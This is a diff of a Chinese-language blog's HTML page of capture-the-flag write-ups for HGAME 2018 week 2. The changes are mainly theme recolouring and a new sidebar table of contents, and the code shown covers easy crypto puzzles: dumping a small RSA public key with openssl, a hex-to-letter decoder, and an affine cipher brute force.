-</span><span>    </span><span style="color:#bf616a;">00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
-</span><span>    </span><span style="color:#bf616a;">1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
-</span><span>    </span><span style="color:#bf616a;">be:30:dd
-</span><span style="color:#bf616a;">Exponent:</span><span> 65537 (0x10001)
-</span><span style="color:#bf616a;">Modulus</span><span>=</span><span style="color:#a3be8c;">C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
-</span><span style="color:#bf616a;">-----BEGIN</span><span> PUBLIC KEY-----
-</span><span style="color:#bf616a;">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
-</span><span style="color:#bf616a;">yigb/+l/vjDdAgMBAAE</span><span>=
-</span><span style="color:#bf616a;">-----END</span><span> PUBLIC KEY-----
-</span><span style="color:#bf616a;">writing</span><span> RSA key
+<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> openssl rsa</span><span style="font-style:italic;color:#95cc5e;"> -pubin -in</span><span> pubkey.pem</span><span style="font-style:italic;color:#95cc5e;"> -text -modulus
+</span><span style="color:#d0dfe6;">Public-Key:</span><span> (256 bit)
+</span><span style="color:#d0dfe6;">Modulus:
+</span><span>    </span><span style="color:#d0dfe6;">00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
+</span><span>    </span><span style="color:#d0dfe6;">1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
+</span><span>    </span><span style="color:#d0dfe6;">be:30:dd
+</span><span style="color:#d0dfe6;">Exponent:</span><span> 65537 (0x10001)
+</span><span style="color:#d0dfe6;">Modulus</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
+</span><span style="color:#d0dfe6;">-----BEGIN</span><span> PUBLIC KEY-----
+</span><span style="color:#d0dfe6;">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
+</span><span style="color:#d0dfe6;">yigb/+l/vjDdAgMBAAE</span><span style="color:#748aa6;">=
+</span><span style="color:#d0dfe6;">-----END</span><span> PUBLIC KEY-----
+</span><span style="color:#d0dfe6;">writing</span><span> RSA key
 </span><span>
 </span></code></pre>
 <p>256位嘛，好说了</p>
@@ -348,19 +348,19 @@ violence</li>
 <p>直接在线解咯</p>
 <p>要分析的话，就是指数重叠+频率分析？</p>
 <h2 id="violence">violence</h2>
-<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>a = &quot;</span><span style="color:#a3be8c;">191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105</span><span>&quot;
-</span><span>a = a.</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">_</span><span>&#39;,&#39;&#39;)
-</span><span>str = &quot;&quot;
-</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>,</span><span style="color:#bf616a;">int</span><span>(</span><span style="color:#96b5b4;">len</span><span>(a)/</span><span style="color:#d08770;">2</span><span>)):
-</span><span>	str+=</span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;)+</span><span style="color:#bf616a;">int</span><span>(a[</span><span style="color:#d08770;">2</span><span>*i]+a[</span><span style="color:#d08770;">2</span><span>*i+</span><span style="color:#d08770;">1</span><span>],</span><span style="color:#d08770;">16</span><span>))
-</span><span style="color:#96b5b4;">print</span><span>(str)
+<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span>a </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105</span><span style="color:#516a88;">&quot;
+</span><span>a </span><span style="color:#748aa6;">= </span><span>a.</span><span style="color:#d0dfe6;">replace</span><span>(</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">_</span><span style="color:#516a88;">&#39;</span><span>,</span><span style="color:#516a88;">&#39;&#39;</span><span>)
+</span><span style="font-style:italic;color:#267fb5;">str </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&quot;&quot;
+</span><span style="color:#748aa6;">for </span><span>i </span><span style="color:#748aa6;">in </span><span style="color:#267fb5;">range</span><span>(</span><span style="color:#6ee2ff;">0</span><span>,</span><span style="font-style:italic;color:#267fb5;">int</span><span>(</span><span style="color:#267fb5;">len</span><span>(a)</span><span style="color:#748aa6;">/</span><span style="color:#6ee2ff;">2</span><span>)):
+</span><span>	</span><span style="font-style:italic;color:#267fb5;">str</span><span style="color:#748aa6;">+=</span><span style="color:#267fb5;">chr</span><span>(</span><span style="color:#267fb5;">ord</span><span>(</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">a</span><span style="color:#516a88;">&#39;</span><span>)</span><span style="color:#748aa6;">+</span><span style="font-style:italic;color:#267fb5;">int</span><span>(a[</span><span style="color:#6ee2ff;">2</span><span style="color:#748aa6;">*</span><span>i]</span><span style="color:#748aa6;">+</span><span>a[</span><span style="color:#6ee2ff;">2</span><span style="color:#748aa6;">*</span><span>i</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1</span><span>],</span><span style="color:#6ee2ff;">16</span><span>))
+</span><span style="color:#267fb5;">print</span><span>(</span><span style="font-style:italic;color:#267fb5;">str</span><span>)
 </span></code></pre>
-<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pycipher </span><span style="color:#b48ead;">import </span><span>Affine
+<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pycipher </span><span style="color:#748aa6;">import </span><span>Affine
 </span><span>
-</span><span>s = [</span><span style="color:#d08770;">1</span><span>,</span><span style="color:#d08770;">3</span><span>,</span><span style="color:#d08770;">5</span><span>,</span><span style="color:#d08770;">7</span><span>,</span><span style="color:#d08770;">9</span><span>,</span><span style="color:#d08770;">11</span><span>,</span><span style="color:#d08770;">15</span><span>,</span><span style="color:#d08770;">17</span><span>,</span><span style="color:#d08770;">19</span><span>,</span><span style="color:#d08770;">21</span><span>,</span><span style="color:#d08770;">23</span><span>,</span><span style="color:#d08770;">25</span><span>]
-</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span>s:
-</span><span>	</span><span style="color:#b48ead;">for </span><span>j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>,</span><span style="color:#d08770;">25</span><span>):
-</span><span>		</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">Affine</span><span>(</span><span style="color:#bf616a;">a</span><span>=i,</span><span style="color:#bf616a;">b</span><span>=j).</span><span style="color:#bf616a;">encipher</span><span>(&#39;</span><span style="color:#a3be8c;">zxjfghjfzhggdvfzdkhgxmuhxcfqrf</span><span>&#39;).</span><span style="color:#bf616a;">lower</span><span>())
+</span><span>s </span><span style="color:#748aa6;">= </span><span>[</span><span style="color:#6ee2ff;">1</span><span>,</span><span style="color:#6ee2ff;">3</span><span>,</span><span style="color:#6ee2ff;">5</span><span>,</span><span style="color:#6ee2ff;">7</span><span>,</span><span style="color:#6ee2ff;">9</span><span>,</span><span style="color:#6ee2ff;">11</span><span>,</span><span style="color:#6ee2ff;">15</span><span>,</span><span style="color:#6ee2ff;">17</span><span>,</span><span style="color:#6ee2ff;">19</span><span>,</span><span style="color:#6ee2ff;">21</span><span>,</span><span style="color:#6ee2ff;">23</span><span>,</span><span style="color:#6ee2ff;">25</span><span>]
+</span><span style="color:#748aa6;">for </span><span>i </span><span style="color:#748aa6;">in </span><span>s:
+</span><span>	</span><span style="color:#748aa6;">for </span><span>j </span><span style="color:#748aa6;">in </span><span style="color:#267fb5;">range</span><span>(</span><span style="color:#6ee2ff;">0</span><span>,</span><span style="color:#6ee2ff;">25</span><span>):
+</span><span>		</span><span style="color:#267fb5;">print</span><span>(</span><span style="color:#d0dfe6;">Affine</span><span>(</span><span style="font-style:italic;color:#95cc5e;">a</span><span style="color:#748aa6;">=</span><span>i,</span><span style="font-style:italic;color:#95cc5e;">b</span><span style="color:#748aa6;">=</span><span>j).</span><span style="color:#d0dfe6;">encipher</span><span>(</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">zxjfghjfzhggdvfzdkhgxmuhxcfqrf</span><span style="color:#516a88;">&#39;</span><span>).</span><span style="color:#d0dfe6;">lower</span><span>())
 </span></code></pre>
 <p>然后找到</p>
 <p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_220623.png" alt="violence" /></p>
@@ -371,8 +371,16 @@ violence</li>
         </div>
 
         
-          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
-          <aside class="sidebar" name="sidebar">
+        
+        <button class="sidebar-toggle left-sidebar-toggle" onclick="openSidebar()">O</button>
+        <aside class="sidebar left" name="sidebar">
+          
+          <div class="sidebar-content-toggle">
+            <a name="swith-to-toc-button" class="actived" onclick="switchToTOC()">Table of Content</>
+            <a name="swith-to-about-authour-button" onclick="switchToAboutAuthor()">About Author</a>
+          </div>
+          
+          <div class="sidebar-overview"  style="opacity:0;display:none" >
             <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
               
               <img class="site-author-image" itemprop="image"
@@ -384,54 +392,164 @@ violence</li>
             </div>
             <div class="feed-link">
               
-                <a rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
-                  RSS
-                </a>
+              <a rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
+                RSS
+              </a>
               
             </div>
             <div class="links-of-author">
               
-                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
-                  <i class="fa-brands fa-github"></i>
-                </a>
+              <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
+                <i class="fa-brands fa-github"></i>
+              </a>
               
-                <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
-                  <i class="fa-solid fa-envelope"></i>
-                </a>
+              <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
+                <i class="fa-solid fa-envelope"></i>
+              </a>
               
             </div>
             <div class="links-of-blogroll">
               
-                <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
+              <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
               
-                <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
+              <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
               
-                <a href="https:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
+              <a href="https:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
               
-                <a href="https:&#x2F;&#x2F;way.lu&#x2F;">Phosphorus</a>
+              <a href="https:&#x2F;&#x2F;way.lu&#x2F;">Phosphorus</a>
               
-                <a href="https:&#x2F;&#x2F;edwardzcn.github.io&#x2F;">Edwardzcn</a>
+              <a href="https:&#x2F;&#x2F;edwardzcn.github.io&#x2F;">Edwardzcn</a>
               
-                <a href="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;csu-lmw&#x2F;">吕少</a>
+              <a href="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;csu-lmw&#x2F;">吕少</a>
               
-                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
+              <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
               
             </div>
-          </aside>
+          </div>
+          <div class="sidebar-toc">
+          
+          <ul>
+          
+          <li>
+          <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#web">Web</a>
+            
+            <ul>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#random">Random?</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#cao-mei-she-qu-1">草莓社区-1</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#cao-mei-she-qu-2">草莓社区-2</a>
+              
+            </li>
+            
+            </ul>
+            
+          </li>
+          
+          <li>
+          <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#pwn">PWN</a>
+            
+            <ul>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#ez-shellcode">ez_shellcode</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#ez-bash-jail">ez bash jail</a>
+              
+            </li>
+            
+            </ul>
+            
+          </li>
+          
+          <li>
+          <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#misc">Misc</a>
+            
+            <ul>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#xiu-xiu-xiu">咻咻咻</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#white-cosmos">White cosmos</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#easy-password">easy password</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#mysterious-file-header">mysterious file header</a>
+              
+            </li>
+            
+            </ul>
+            
+          </li>
+          
+          <li>
+          <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#crypto">Crypto</a>
+            
+            <ul>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#easy-rsa">easy rsa</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#the-same-simple-rsa">The same simple RSA</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#caesar-caesar">Caesar&amp;&amp;Caesar</a>
+              
+            </li>
+            
+            <li>
+            <a href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/#violence">violence</a>
+              
+            </li>
+            
+            </ul>
+            
+          </li>
+          
+          </ul>
+          
+          </div>
+        </aside>
+        
         
 
       </main>
 
       
-        <footer name="footer">
-          <div class="copyright">
-            <span item="copyrightYear">© 2018-2022</span>
-            <span class="author">CSUwangj</span>
-          </div>
-          <div class="powered-by">
-            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
-          </div>
-        </footer>
+      <footer name="footer">
+        <div class="copyright">
+          <span item="copyrightYear">© 2018-2022</span>
+          <span class="author">CSUwangj</span>
+        </div>
+        <div class="powered-by">
+          Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
+        </div>
+      </footer>
       
     </body>
 
